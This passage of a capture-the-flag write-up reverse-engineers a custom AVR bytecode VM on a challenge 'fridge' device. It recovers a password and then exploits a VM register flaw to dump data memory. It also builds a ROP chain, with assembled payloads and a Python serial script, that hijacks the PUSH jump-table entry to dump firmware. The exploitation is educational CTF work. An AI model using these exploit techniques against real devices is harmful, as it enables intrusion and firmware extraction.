                                    │  Extract the lower 6  │ andi r16, 0x3f     │                    │
                                    │  bits and compare them│ ldi r17, 0x00      │                    │
                                    │  to current opcode    │ ldi r18, 0x00      │                    │
                                    │                       │ ldi r19, 0x00      │                    │
                                    │                       │ cp r16, r20        │                    │
                                    │                       │ cpc r17, r21       │                    │
                                    │                       │ cpc r18, r22       │                    │
                                    │                       │ cpc r19, r23       │                    │
                                    │   Found?              │ brne 0x1d62 ;[ge]  │                    │
                                    │                       └────────────────────┘                    │
                                    │                               │ t      Not found, increment the │
                                    │             ┌─────────────────│ └─────┐ counter and loop again, │
                                    │             │                 │       │ ad most 0x1d times      │
                                    │             │                 │       │                         │
                                    │     ┌────────────────────┐    │ ┌────────────────────┐          │
                        Found! load the   │  0x1d56 ;[gk]      │    │ │  0x1d62 ;[gh]      │          │
                        next 2 bytes, and │ ldd r0, z+1        │    │ │ adiw r24, 0x01     │          │
                        call it as a      │ ldd r31, z+2       │    │ │ cpi r24, 0x1e      │          │
                        function, passing │ mov r30, r0        │    │ │ cpc r25, r1        │          │
                        register_base as  │ movw r24, r28      │    │ │ brne 0x1d34 ;[gg]  │          │
                        argument    │     │ icall ;[gf]        │    │ └────────────────────┘          │
                                    │     │ rjmp 0x1d7e ;[gc]  │    └───────┘ f                       │
                                    │     └────────────────────┘              │                       │
                                    │         v         ┌─────────────────────┘                       │
                                    │     ┌───┘         │                                             │
                                    │     │             │                                             │
                                    │     │             │  Invalid opcode, raise the FAIL flag        │
                                    │     │     ┌───────────────────────────────────────────────┐     │
                                    │     │     │  0x1d6a ;[gn]                                 │     │
                                    │     │     │ ldi r24, 0x47                                 │     │
                                    │     │     │ ldi r25, 0x03                                 │     │
                                    │     │     │ call fcn.print_cstring ;[gh]                  │     │
                                    │     │     │ call fcn.pause_press_enter_to_continue ;[gi]  │     │
                                    │     │     │ ldd r24, y+32                                 │     │
                                    │     │     │ ori r24, 0x04                                 │     │
                                    │     │     │ ori r24, 0x08                                 │     │
                                    │     │     │ std y+32, r24                                 │     │
                                    │     │     └───────────────────────────────────────────────┘     │
                                    │     │         v                                                 │
                             ┌──────────────────────┘                                                 │
                             │                                                                        │
                             │                                                                        │
                         ┌─────────────────────────────────────────────────┐                          │
                         │  0x1d7e ;[gd]                                   │                          │
                         │      ; JMP XREF from 0x00001d60 (fcn.00001cd4)  │                          │
                         │      ; JMP XREF from 0x00001d24 (fcn.00001cd4)  │                          │
                         │ ldi r24, 0x00                                   │                          │
                         │ rjmp 0x1d84 ;[gj]                               │                          │
                         └─────────────────────────────────────────────────┘                          │
                             v                                                                        │
                             └─────────────────────────┌──────────────────────────────────────────────┘
                                                       │
```

Here's a recap of what this does:

- read the first byte of the next instruction (the opcode)
- if that's 0, then it's a NOP
- if it's 0x1f is HLT
- otherwise it searches for it linearly in an array of structures located in data memory at `0x16a`, these structures have 2 fields:
	- opcode, it's one byte
	- implementation, it's a 16-bits pointer
- if the opcode has been found, the implementation is called passing the register_base as argument
- this function will exectute a single instruction and returns to the caller. If the return value is 1, execution will stop (the HLT case)

Differently from all the other instructions, NOP and HLT aren't implemented through their own function. Instead they are handled in the decoding loop.

Here's a dump of the jump table / implementations array:

```
:> px 0x5a
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x0000016a  01f2 0d02 3e0e 0337 0904 6b09 05b5 0906  ....>..7..k.....
0x0000017a  970e 07e4 0e08 070a 0944 0a0a 870a 0bc4  .........D......
0x0000018a  0a0c 010b 0d3e 0b0e 6e0b 0fad 0b10 ec0b  .....>..n.......
0x0000019a  1145 0c12 310f 1394 0814 5b08 1579 0816  .E..1.....[..y..
0x000001aa  9e0c 17e7 0c18 040d 1921 0d1a 3e0d 1b5b  .........!..>..[
0x000001ba  0d1c 930d 1dba 0d1e d80d                 ..........
```

Please note that the challenge description claims that the provided binary has been taken from a "similar" fridge to the one from which the memory dump has been extracted. In fact the implementation offsets found here aren't the same we found in the provided binary, to correlate them we can check using the opcode identifier we already saw when calling the instruction length lookup function and compare.

For example:

- the PUSH instruction seems to have opcode `0x01`
- our implementation is at `0x193a`
- in memory dump the implementation field for opcode `0x01` points to `0xdf2 * 2 = 0x1be4` (multiplied by 2 because instruction pointer in avr points to words)
- taking the difference, our one seem to be offset by `?vi 0x193a - 0x1be4` which is `-682` bytes
- checking that for the other opcodes confirm both the offset theory and that the opcodes used to get the function lengths are the real opcodes

At this point we know nearly everything about the VM. All of this translates into [this r2 plugin](https://github.com/mrmacete/writeups/tree/master/rhme2/fridge-plugin) which enables us to disassemble, analyse, assemble the fridge bytecode.

### Finding the bytecode

Now we have a disassembler, we need to find the bytecode to disassemble. We know that the bytecode base address is stored on a special register located at `[register_base+37, register_base+38]`, but searching for `/c +37` shows only load instructions, while we need the initialization:

```
[0x00000000]> e search.from=0
[0x00000000]> /c +37
0x00000290   # 2: ldd r3, z+37
0x00000664   # 2: ldd r24, z+37
0x00000684   # 2: ldd r22, z+37
0x00000a86   # 2: ldd r30, y+37
0x00000b76   # 2: ldd r30, y+37
0x00000c56   # 2: ldd r24, y+37
0x00000e0e   # 2: ldd r26, z+37
0x00000e4a   # 2: ldd r26, z+37
0x00000fca   # 2: ldd r30, y+37
0x00001036   # 2: ldd r26, y+37
0x000010ce   # 2: ldd r26, y+37
0x0000116a   # 2: ldd r30, y+37
0x000011e8   # 2: ldd r30, y+37
0x0000126a   # 2: ldd r30, y+37
0x000012e4   # 2: ldd r30, y+37
0x0000135e   # 2: ldd r30, y+37
0x000013d8   # 2: ldd r30, y+37
0x00001438   # 2: ldd r30, y+37
0x000014b6   # 2: ldd r30, y+37
0x00001538   # 2: ldd r30, y+37
0x000015ea   # 2: ldd r30, y+37
0x000016ac   # 2: ldd r30, y+37
0x00001882   # 2: ldd r30, y+37
0x00001940   # 2: ldd r30, y+37
0x000019dc   # 2: ldd r30, y+37
0x00001a8a   # 2: ldd r30, y+37
0x00001b24   # 2: ldd r30, y+37
0x00001bd4   # 2: ldd r30, y+37
0x00001cf4   # 2: ldd r30, y+37
```

Probably they're initialized using absolute addressing, so we might need the value of `register_base`. Let's search backwards from the decoding function (at `0x00001cd4`) we just analysed, which has that value as arg0 in `[r24, r25]`:

```
[0x00001cd4]> /c 1cd4
0x00000ab0   # 4: call fcn.00001cd4
0x00000b4a   # 4: call fcn.00001cd4
[0x00001cd4]> # just use the first one
[0x00001cd4]> s 0x00000ab0
```

Also the caller receives the base address as arg0, so let's manually find the beginning of the caller, which is at `0x00000a46` (right at the beginning of pushing things, and right after an unconditional jump belonging to some other function), and search for calls to it:

```
[0x00000a46]> /c a46
0x00000d2a   # 4: call 0xa46
0x00000dce   # 4: call 0xa46
[0x00000a46]> # again the first one
[0x00000a46]> s 0x00000d2a
```

Like before, also this caller receives it as arg0, find the beginning of the function at `0x00000c6c` and search for callers:

```
[0x00000c6c]> /c c6c
0x00000de8   # 4: call 0xc6c
[0x00000c6c]> s 0x00000de8
```

This time we're lucky:

```
      ┌┌──> 0x00000de4      8ae9           ldi r24, 0x9a
      |||   0x00000de6      95e0           ldi r25, 0x05
      |||   ;-- hit0_0:
      |||   0x00000de8      0e943606       call 0xc6c
```

So `register_base` is at `0x59a` in data memory, this means that the bytecode base is stored in 2 bytes at `?v 0x59a + 37` which is `0x5bf`, let's see where it's written to:

```
[0x00000de4]> /c 5bf
0x0000223a   # 4: sts 0x5bf, r24
```

Yay! we found it:

```
            0x00002232      88eb           ldi r24, 0xb8
            0x00002234      92e0           ldi r25, 0x02
            0x00002236      9093c005       sts 0x5c0, r25
            0x0000223a      8093bf05       sts 0x5bf, r24
```

So, if we're lucky enough, our bytecode is in memory dump at address `0x2b8`, let's extract it:

```
$ r2 memory.dmp
 -- Invert the block bytes using the 'I' key in visual mode
[0x00000000]> s 0x2b8
[0x000002b8]> wtf! i_am_bytecode.bin
dumped 0x648 bytes
Dumped 1608 bytes from 0x000002b8 into i_am_bytecode.bin
[0x000002b8]>
```

### Finding the password

After installing the plugin with `make install` in its source dir, let's open the bytecode with `r2 -a fridge i_am_bytecode.bin`.

At the beginning there's what looks like a main function:

```
; construct the string "Password: " on the stack
; a quick way to see it in r2 is
; ?x-50617373776f72643a2000
            0x00000000      05002500       MOVH R0, 0x2500
            0x00000004      0400203a       MOVL R0, 0x203a
            0x00000008      0100           PUSH R0
            0x0000000a      05006472       MOVH R0, 0x6472
            0x0000000e      04006f77       MOVL R0, 0x6f77
            0x00000012      0100           PUSH R0
            0x00000014      05007373       MOVH R0, 0x7373
            0x00000018      04006150       MOVL R0, 0x6150
            0x0000001c      0100           PUSH R0
            
; call function at 0x88, explained later
            0x0000001e      04500088       MOVL R5, 0x0088
            0x00000022      1250           CALL R5
            
; call the function at 0xa8, with 2 arguments:
; arg0 is the stack pointer
; arg1 is what looks like a length
; i won't dive in much detail on this, but what it does is
; printing R1 chars from the string at R0
            0x00000024      0306           MOV R0, SP
            0x00000026      0410000a       MOVL R1, 0x000a
            0x0000002a      045000a8       MOVL R5, 0x00a8
            0x0000002e      1250           CALL R5
            
; finally call the function at 0x0120, this looks like a
; function which will never return, since after the call
; are only invalid bytes, so this must be what reads and
; validates the password
            0x00000030      04500120       MOVL R5, 0x0120
            0x00000034      1250           CALL R5
            0x00000036      67             invalid
            0x00000037      c6             invalid
```

Before diving into the password checking itself, let's see what function at `0x88` does:

```
            0x00000088      04100004       MOVL R1, 0x0004
            0x0000008c      045000a8       MOVL R5, 0x00a8
            0x00000090      1d             DFAIL
        ┌─< 0x00000091      180026         JNZ 0x0098
; if debugger is not present, just return
        │   0x00000094      13             RET
        │   0x00000095      ff             invalid
        │   0x00000096      4a             invalid
        │   0x00000097      ec             invalid
        
; debugger is present, print "Err!" and stop the execution
        └─> 0x00000098      05002172       MOVH R0, 0x2172
            0x0000009c      04007245       MOVL R0, 0x7245
            0x000000a0      0100           PUSH R0
            0x000000a2      0306           MOV R0, SP
            0x000000a4      1250           CALL R5
            0x000000a6      1f             HLT
```

We can call the above function `fail_on_debugger`. I guess this anti-debugging trick is in place for people trying to solve this on other challanges' binaries in which it's possible to load arbitrary VM code and start debugging it. In this case we just statically analyse this, so anti-debugging is harmless and can be ignored.

Here's the password checking function seen from the Moon:

```
[ 0x120 ]
(fcn) fcn.00000120 142                           <@@@@@@>
  fcn.00000120 ();                                    f t
MOVL R0, 0x0011                                 ┌─────┘ │
MOVL R5, 0x00c4                                 │       │
CALL R5                                         │       │
MOVL R3, 0x0002                            __x13d__     │
MOVL R5, 0x0038                                 f t     │
CALL R5                                   ┌─────┘ │     │
MOVL R5, 0x018c                           │       │     │
CALL R5                                   │       │     │
JNZ 0x0184 ;[ga]                     __x146__     │     │
                                          f t     │     │
                                    ┌─────┘ │     │     │
                                    │       │     │     │
                                    │       │     │     │
                               __x14f__     │     │     │
                                    f t     │     │     │
                              ┌─────┘ │     │     │     │
                              │       │     │     │     │
                              │       │     │     │     │
                         __x158__     │     │     │     │
                              f t     │     │     │     │
                         ┌────┘ │     │     │     │     │
                         │      │     │     │     │     │
                         │      │     │     │     │     │
                    __x161__    │     │     │     │     │
                         f t    │     │     │     │     │
                   ┌─────┘ │    │     │     │     │     │
                   │       │    │     │     │     │     │
                   │       │    │     │     │     │     │
              __x16a__     │    │     │     │     │     │
                   f t     │    │     │     │     │     │
             ┌─────┘┌┘     │    │     │     │     │     │
             │      │      │    │     │     │     │     │
             │      │      │    │     │     │     │     │
             │      │      │    │     │     │     │     │
        __x173__    │      └─────┐    │     │     │     │
             f t    │           ││    │     │     │     │
        ┌────┘┌┘    │           ││    │     │     │     │
        │     │     │           ││    │     │     │     │
        │     │     │           ││    │     │     │     │
   __x17c__   │     │           ││    │     │     │     │
    v         │     │           ││    │     │     │     │
    └──────────────────────────┐─────┐┘─────┘─────┘─────┘
                               │ │   │
                               │ │   │
                              __x184__
```

Without even reading the code, it's immediately obvious that it's composed of sequential blocks, the outcome of each block determines whether the next block is issued or if we'll go to beach at `0x184`.

Let's start from the beach, which boils down to calling `0x50`:

```
│ └└└└└└└─> 0x00000184      04500050       MOVL R5, 0x0050
│           0x00000188      1250           CALL R5
```
Which is this:

```
            0x00000050      0a11           XOR R1, R1
            0x00000052      0410000a       MOVL R1, 0x000a
            
; Load "Incorrect!" string on the stack
            0x00000056      05004500       MOVH R0, 0x4500
            0x0000005a      04002174       MOVL R0, 0x2174
            0x0000005e      0100           PUSH R0
            0x00000060      05006365       MOVH R0, 0x6365
            0x00000064      04007272       MOVL R0, 0x7272
            0x00000068      0100           PUSH R0
            0x0000006a      05006f63       MOVH R0, 0x6f63
            0x0000006e      04006e49       MOVL R0, 0x6e49
            0x00000072      0100           PUSH R0
            
; Print 10 chars from the stack
            0x00000074      0306           MOV R0, SP
            0x00000076      045000a8       MOVL R5, 0x00a8
            0x0000007a      0a44           XOR R4, R4
            0x0000007c      1250           CALL R5
        ┌─< 0x0000007e      140021         JMP 0x0084                  ;[1]
        │   0x00000081      00             NOP
        │   0x00000082      00             NOP
        │   0x00000083      00             NOP
        
 ; jumps into itself forever
       └└─> 0x00000084      140021         JMP 0x0084                  ;[1]
```

Which only prints "Incorrect!" and terminates with a nicely tight infinite loop.

So our mission is never reach the beach, thus satisfying all the checking blocks depicted above.

So let's dive into the checking function piece by piece. First of all the password is read:

```
│           0x00000120      04000011       MOVL R0, 0x0011
; read the password by calling function 0xc4
│           0x00000124      045000c4       MOVL R5, 0x00c4
│           0x00000128      1250           CALL R5
```

After that, `R2` holds the number of bytes read, and the password is stored at address `0`, and `R0` points to it.

#### Check 1 - password length

The first check is implemented at `0x38`:

```
; negate all the bits of the length, and compare it with
; the constant 0xffffffee, the inverse of which is 0x11
            0x00000038      0540ffff       MOVH R4, 0xffff
            0x0000003c      0440ffee       MOVL R4, 0xffee
            0x00000040      0d20           INV R2
            
; if length != 0x11, call 0x50, i.e. the beach
            0x00000042      1624           CMP R2, R4
        ┌─< 0x00000044      180012         JNZ 0x0048                  ;[1]
        │   0x00000047      13             RET
        └─> 0x00000048      04500050       MOVL R5, 0x0050
            0x0000004c      1250           CALL R5
```

So we have a first constraint: the password length must be 17.

#### Check 2

The second check is at `0x18c`:

```
; run anti-debugging check (let's ignore it)
│           0x0000018c      04500088       MOVL R5, 0x0088
│           0x00000190      1250           CALL R5

; load the first 4 chars as a 32-bit little endian integer,
; and rotate it left by 17 (R2 holds the inverted length,
; re-inverting it back here)
│           0x00000192      0640           LD R4, R0
│           0x00000194      0d20           INV R2
│           0x00000196      1042           ROL R4, R2

; XOR the result with the constant 0x3d6782a5
│           0x00000198      05103d67       MOVH R1, 0x3d67
│           0x0000019c      041082a5       MOVL R1, 0x82a5
│           0x000001a0      0a41           XOR R4, R1

; ensure it's equal to the constant 0x5dd53c4f
│           0x000001a2      05105dd5       MOVH R1, 0x5dd5
│           0x000001a6      04103c4f       MOVL R1, 0x3c4f

; the result of this comparison is then checked by the caller
│           0x000001aa      1614           CMP R1, R4
└           0x000001ac      13             RET
```

Reversing this logic, it means the first 4 chars of the password must be `Y0u_`:

```
:> ?v 0x5dd53c4f ^ 0x3d6782a5
0x60b2beea
:> "ae 0xffffffff,17,0x60b2beea,>>>,&"
0x5f753059
:> ?x-5f753059
_u0Y
```

(sorry for using ESIL as a calculator, but it's handy to perform rotations)

#### Check 3

Third check is at `0x1b0`:

```
; R3 holds the constant 2, therefore adding it to R0
; means moving the check cursor to the third password char
            0x000001b0      0803           ADD R0, R3
            
; read 4 bytes of the password at that point
            0x000001b2      0640           LD R4, R0
            
; add 0x2325dbf8 to the just read value
            0x000001b4      05102325       MOVH R1, 0x2325
            0x000001b8      0410dbf8       MOVL R1, 0xdbf8
            0x000001bc      0841           ADD R4, R1
            
; ensure it's equal to 0x536d3b6d
            0x000001be      0510536d       MOVH R1, 0x536d
            0x000001c2      04103b6d       MOVL R1, 0x3b6d
            0x000001c6      1614           CMP R1, R4
            0x000001c8      13             RET
```

Let's reverse this again:

```
:> ?v 0x536d3b6d - 0x2325dbf8
0x30475f75
:> ?x-30475f75
0G_u
```

So here's another piece: `u_G0`, so our password for now it's `Y0u_G0`. 

#### Check 4

This is at `0x1cc`:

```
; advance by 2 and read the integer from password
            0x000001cc      0803           ADD R0, R3
            0x000001ce      0640           LD R4, R0
            
; load the constant 0x5f543047 in R2 in a funny way
            0x000001d0      0a22           XOR R2, R2
            0x000001d2      04100010       MOVL R1, 0x0010
            0x000001d6      04500054       MOVL R5, 0x0054
            0x000001da      0e51           LSL R5, R1
            0x000001dc      0c25           OR R2, R5
            0x000001de      04100000       MOVL R1, 0x0000
            0x000001e2      04500047       MOVL R5, 0x0047
            0x000001e6      0e51           LSL R5, R1
            0x000001e8      0c25           OR R2, R5
            0x000001ea      04100008       MOVL R1, 0x0008
            0x000001ee      04500030       MOVL R5, 0x0030
            0x000001f2      0e51           LSL R5, R1
            0x000001f4      0c25           OR R2, R5
            0x000001f6      04100018       MOVL R1, 0x0018
            0x000001fa      0450005f       MOVL R5, 0x005f
            0x000001fe      0e51           LSL R5, R1
            0x00000200      0c25           OR R2, R5
            
; ensure that this password piece is equal to 0x5f543047            
            0x00000202      0942           SUB R4, R2
            0x00000204      0a22           XOR R2, R2
            0x00000206      1624           CMP R2, R4
            
; put back the last value of R5, 0x5f, for the next time (or not)
            0x00000208      1151           ROR R5, R1
            0x0000020a      13             RET
```

No logic to reverse here:

```
:> ?x-5f543047
_T0G
```

Our password grows to `Y0u_G0T_`. Since these checks overlap by 2 (because we're checking 4 bytes at a time, but advancing by 2), half of them is useless, so let's skip to Check 6.

#### Check 6

```
            0x00000234      04500088       MOVL R5, 0x0088
            0x00000238      1250           CALL R5
            
; advance and load the word
            0x0000023a      0803           ADD R0, R3
            0x0000023c      0640           LD R4, R0
            
; rotate password word right by 0x13
            0x0000023e      04500013       MOVL R5, 0x0013
            0x00000242      1145           ROR R4, R5
           
; xor it with 0x3815cfb2 rotated left by 0x13
            0x00000244      05103815       MOVH R1, 0x3815
            0x00000248      0410cfb2       MOVL R1, 0xcfb2
            0x0000024c      1015           ROL R1, R5
            0x0000024e      0a41           XOR R4, R1
            
; ensure the result is equal to 0x9317eee5
            0x00000250      05109317       MOVH R1, 0x9317
            0x00000254      0410eee5       MOVL R1, 0xeee5
            0x00000258      1614           CMP R1, R4
            0x0000025a      13             RET
```

Let's reverse:

```
:> "ae 0xffffffff,0x13,0x3815cfb2,<<<,&"
0x7d91c0ae
:> ?v 0x7d91c0ae ^ 0x9317eee5
0xee862e4b
:> "ae 0xffffffff,0x13,0xee862e4b,<<<,&"
0x725f7431
:> ?x-0x725f7431
r_t1
```

Yay, one more piece, and the password keeps growing: `Y0u_G0T_1t_r`. Let's skip to Check 8.

#### Check 8

```
; advance and load
            0x00000270      0803           ADD R0, R3
            0x00000272      0640           LD R4, R0
            
; R1 and R2 hold the constants used in previous checks:
; R1 = 0x9317eee5
; R2 = 0xd419837a
; sum them in R1 (= 0x6731725f) and subtract the word
            0x00000274      0812           ADD R1, R2
            0x00000276      0914           SUB R1, R4
            
; rotate right by the current cursor value (12 in this case)
            0x00000278      1110           ROR R1, R0
            
; ensure it's 0xb2ef2c90
            0x0000027a      0540b2ef       MOVH R4, 0xb2ef
            0x0000027e      04402c90       MOVL R4, 0x2c90
            0x00000282      1614           CMP R1, R4
            0x00000284      13             RET
```

The inverse logic is:

```
:> "ae 0xffffffff,12,0xb2ef2c90,<<<,&"
0xf2c90b2e
:> ?v (0x6731725f - 0xf2c90b2e) & 0xffffffff
0x74686731
:> ?x-74686731
thg1
```

Here it grows again: `Y0u_G0T_1t_r1ght`

#### Check 9 - tha last!

```
; advance and load, cursor is now 14
            0x00000288      0803           ADD R0, R3
            0x0000028a      0640           LD R4, R0
            
; word XOR 14
            0x0000028c      0a40           XOR R4, R0

; XOR with 0xb2ef2c90 (the last value of R1 on Check 8)
            0x0000028e      0a41           XOR R4, R1
            
; XOR with 0xd419837a
            0x00000290      0a42           XOR R4, R2
            
; XOR with 2
            0x00000292      0a43           XOR R4, R3
            
; should be equal to 0x66d7db8e
            0x00000294      052066d7       MOVH R2, 0x66d7
            0x00000298      0420db8e       MOVL R2, 0xdb8e
            0x0000029c      1624           CMP R2, R4
            0x0000029e      13             RET
```

Reverse logic:

```
:> ?v 0x66d7db8e ^ 2
0x66d7db8c
:> ?v 0x66d7db8c ^ 0xd419837a
0xb2ce58f6
:> ?v 0xb2ce58f6 ^ 0xb2ef2c90
0x217466
:> ?v 0x217466 ^ 14
0x217468
:> ?x-217468
!th
```

So we gained a `!` and a terminator, finishing up the password: `Y0u_G0T_1t_r1ght!`. Which gives us the flag.

## Hide & Seek

The hypothesis is: i bet the flag is in data memory.

Reversing the VM, we saw how the LOAD instruction works:

- the address is relative to a base segment stored in a special register at `[register_base+33, register_base+34]`
- the address is checked to be at most `0x100`, but this happens before adding it to the base segment
- considering all the "normal" registers (`[R0-R7]`) are 32 bits wide, the base segment are the "central" 2 bytes of `R8` (that's why i called it `BS` in the disasm plugin, even if the least significant byte of it are actually the flags)

In this challenge we can upload arbitrary VM bytecode to the device, and let it execute for us.

How can we LOAD outside bounds, thus managing to dump the whole data memory?

If we could set the `BS` to an arbitrary value, we can do that! As already described, almost any instruction which writes to a register, cannot write above `R7`, **except XOR**.

Therefore, the attack plan is:

- sweep the value of `BS` one byte at a time
- use LOAD instruction with address always 0
- OUT that byte

Here is the code:

```
; NOTE: all registers are initialized to 0 at reset time

; R5 will be our increment by one
; it's shifted left by one byte because the actual base address
; is in the central part of BS, like 0x00HILO00
MOVL R5, 0x0100

forever:

; set the base register to R3 using 2 XORs
    XOR BS, BS
    XOR BS, R3
    
; LOAD at base+0
    LD R2, R0
    
; write the byte on the serial
    OUT R2
    
; increment R3 by 1
    ADD R3, R5
    
; do it again
    JMP forever

```

This can be assembled using the fridge r2 plugin, like this:

```
$ rasm2 -a fridge -f dumpmem.asm
045001000a880a8306201c200835140001
```

When assembling, beware that jump targets must be multiples of 4, so if the assembler fails, you should pad with NOPs which are 1-byte long.

Letting that bytecode run for enough time, at some point will print the flag.

## The Weird Machine

In this challenge, again, we control the VM bytecode. Obviously, the first thing to try is to reuse the `dumpmem.asm` from Hide & Seek, just to rule that out. In fact, no flags are found in data memory this time, but having a memory dump is always useful, so let's save it as `weird_dump.bin`.

So here's the hypothesis: the flag is in the program memory.

But how can we dump the program memory? In avr architecture there aren't too much options for controlling code execution: ROP!

To do successful ROP we mainly need two preconditions:

1. to know where are the gadgets in the code
2. be able to write gadget addresses on the stack, or to move the stack into our gadget addresses

### Finding gadgets

We don't have the correct firmware for this challange, but we have another one very similar to this, the one from FridgeJIT. Since we took a data memory dump, it's possible to figure out the offset between the real instruction implementations and the ones on the binary we have, like we did in FridgeJIT, by looking at the jump table in the dump:

```
$ r2 weird_dump.bin
 -- Thank you for using radare2. Have a nice night!
[0x00000000]> px 0x5a@0x16a
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x0000016a  01af 0c02 fb0c 03f4 0704 2808 0572 0806  ..........(..r..
0x0000017a  540d 07bd 0d08 c408 0901 090a 4409 0b81  T...........D...
0x0000018a  090c be09 0dfb 090e 2b0a 0f6a 0a10 a90a  ........+..j....
0x0000019a  1102 0b12 0a0e 1351 0714 1807 1536 0716  .......Q.....6..
0x000001aa  5b0b 17a4 0b18 c10b 19de 0b1a fb0b 1b18  [...............
0x000001ba  0c1c 500c 1d77 0c1e 950c                 ..P..w....
[0x00000000]>
```

Taking our beloved PUSH as a sample, let's compute the offset:

- in the dump, PUSH is at `0xcaf * 2 = 0x195e`
- in the fridge is at `0x193a`
- therefore the FridgeJIT firmware is off by `-0x24` bytes

Under the hypotesis that:

- most of the code is the same
- most of the same code is just off by `-0x24` bytes

we can just find gadgets in the FridgeJIT firmware and add the offset back.

### Controlling the stack (or not)

Given our superpower of VM XOR vulnerability, we're able to read / write anywhere in data memory. Probably there are many ways to write a ROP chain in the stack and get it executed, but that would require knowing exactly where the stack is in a given moment, or spraying / bruteforcing it.

The way i choose is instead to entirely avoid the need to know where the stack is, because we can move it. Let's search for this gadget in the FridgeJIT firmware:

```
[0x00000000]> /R out 0x3d
  0x00002940               debf  out 0x3e, r29
  0x00002942               0fbe  out 0x3f, r0
  0x00002944               cdbf  out 0x3d, r28
  0x00002946               ed01  movw r28, r26
  0x00002948               0895  ret
```

This seems perfect! Except the fact that we need to already control the stack in order to execute the above gadget, right? Wrong! To workaround this catch-22, it's possible to **overwrite the PUSH implementation address** with this gadget's address. In this way, as soon as the VM tries to execute a PUSH, boom! the stack is moved.

But where? How can we control `[r28, r29]`? It turns out that's another thing we can avoid to control: let's look again at the instruction decoding function already discussed above, which is at `0x00001cd4`. The core of it is an `icall` instruction, calling out to the right VM-instruction implementation, just read off the jump table:

```
│           0x00001d5c      ce01           movw r24, r28
│           0x00001d5e      0995           icall
```

Recalling the discussion about instruction implementations, the 16-bits arg0 is the `register_base`. Therefore, `[r28, r29]` at the time of the `icall` **points to the registers**!

This means we have the last piece of our attack plan:

- overwrite the PUSH implementation address with the stack-moving gadget
- fill the VM registers with our ROP chain
- issue a PUSH to trigger it

### The ROP chain

For some reason, not all the register space can host the chain. Instead we have 12 bytes between the lower half of `R4` until the end of `SP`.

To print out program memory, we can reuse the `print_cstring` function:

```
│           0x00000494      cf93           push r28
│           0x00000496      df93           push r29
│           0x00000498      fc01           movw r30, r24
│       ┌─> 0x0000049a      8491           lpm r24, z
│       |   0x0000049c      ef01           movw r28, r30
│       |   0x0000049e      2196           adiw r28, 0x01
│       |   0x000004a0      8823           tst r24
│      ┌──< 0x000004a2      21f0           breq 0x4ac
│      │|   0x000004a4      0e94df01       call print_char

; gadget for calling this function using [r28, r29]
; instead of [r24, r25] we can't control (no gadgets)
│      │|   0x000004a8      fe01           movw r30, r28
│      │└─< 0x000004aa      f7cf           rjmp 0x49a

; gadget for controlling [r28, r29] (beware of endianess)
│      └──> 0x000004ac      df91           pop r29
│           0x000004ae      cf91           pop r28
│           0x000004b0      0895           ret
```

Here is the minimal ROP chain i used:

| Address in FridgeJIT   | With offset and /2 | Meaning
|------------------------|--------------------|--------
| 0x000004ac             | 0x0268             | pop r29; pop r28
| -                      | 0xXXYY             | address of program memory to print
| 0x000004a8             | 0x0266             | print_string([r28,r29]); pop r29; pop r28
| -                      | 0x0000             | padding (will be popped into [r28, r29] by the print function
| 0x00000000             | 0x0000             | reset

The above chain works for printing one byte / string. In order to print all the firmware, an outer logic is needed which detects the reset and re-issues the ROP chain by modifying every time the address to dump.

This is the VM code which triggers this ROP chain:

```
; set the base segment to point to the PUSH
; implementation address in the jump table (0x16b)
XOR BS, BS
MOVH R3, 0x0001
MOVL R3, 0x6b00
XOR BS, R3
XOR R0, R0

; set lower R4 to the stack-moving gadget
; which is 0x14b0 = (0x293c+0x24) / 2
MOVL R4, 0x14b0

; the higher part is set to the subsequent
; value found in the jump table, to avoid
; overwriting with garbage on our 32-bits STORE
MOVH R4, 0xfb02

; store the jump table patch
ST R0, R4

; put the ROP chain in the registers, beware of
; the aligment: AABBCCDD, will become
; 0xAA..
; 0xCCBB
; 0x..DD
; (this took me some time to figure it out)
MOVL R0, 0x02e7  ;
MOVH R0, 0x02e7  ;
MOVL R1, 0x02e7  ;
MOVH R1, 0x02e7  ; ret sled
MOVL R2, 0x02e7  ;
MOVH R2, 0x02e7  ;
MOVL R3, 0x02e7  ;
MOVH R3, 0x02e7  ;
MOVL R4, 0x02e7  ;

; here 0xeeff is the address to be dumped
; this must be replaced with the correct one
; by the outer logic
MOVH R4, 0xee68  ; pop r29; pop r28; ret 
MOVL R5, 0x02ff
MOVH R5, 0x0066  ; print from r28:r29
MOVL SP, 0x0000
MOVH SP, 0x0000  ; reset

; trigger the ROP chain by executing
; the patched PUSH
PUSH R0
```

Assembling this with the fridge plugin, we get the payload:

```
$ rasm2 -a fridge -f superchain.asm
0a880530000104306b000a830a000540fb02044014b00704040002e7050002e7041002e7051002e7042002e7052002e7043002e7053002e7044002e70540ee68045002ff0550006604600000056000000100
```

### The outer logic (in rushed python)

```python
import serial
import binascii
import sys
import time

dump_from = 0
dump_to = 0x4000

s = serial.Serial('/dev/ttyUSB0', timeout=100)

prompt = "Loader> Authentication failed\r\nLoader> Provide bootrom (hex encoded)\r\nLoader> "
oops = "Oops!\r\n"

s.flush()
s.baudrate = '19200'
s.flush()
payload = "0a880530000104306b000a830a000540fb02044014b00704040002e7050002e7041002e7051002e7042002e7052002e7043002e7053002e7044002e70540%02x68045002%02x0550006604600000056000000100"
window = []
size = len(prompt)
addr = dump_from
hist = 0
every = ''
noise = binascii.unhexlify('1b5b313b31481b5b324a')
while addr < dump_to:
    byte = s.read(1)
    hist += 1
    window.append(byte)
    every += byte
    if len(window) > size:
        window = window[-size:]
    wstr = ''.join(window)
    if wstr.find(prompt) >= 0:
        out = every.replace(wstr, '').replace(noise, '') + '\0'
        sys.stdout.write(out[0])
        every = ''
        window = []
        s.write((payload % ((addr & 0xff00) >> 8, addr & 0xff)) + '\r\n')
        s.flush()
        addr += 1
        hist = 0
```

The outer logic is:

1. connect to the device
2. detect the prompt
3. drop the payload, by setting the address to dump with a format string
4. filter the output to remove the prompt itself and other noise
5. go to 2 unless we're done 

This works well, it's spectacularly slow because it keeps only the first byte of the output string, then move to the next. Could have been optimized, but yeah. Another problem of this approach is that it's possible for extraneous bytes to infiltrate the dump, it happens mainly on the very first bytes of the connection. This was annoying because i dumped it piece by piece (3 pieces) and reassembled it later.

### Restoration of glithces

If a single spurious byte infiltrate the dump, the avr disassembly turns quickly in a nightmare:

```
        ┌─< 0x00000000      1b11           cpse r17, r11               ;[1]
        │   0x00000002      241f           adc r18, r20
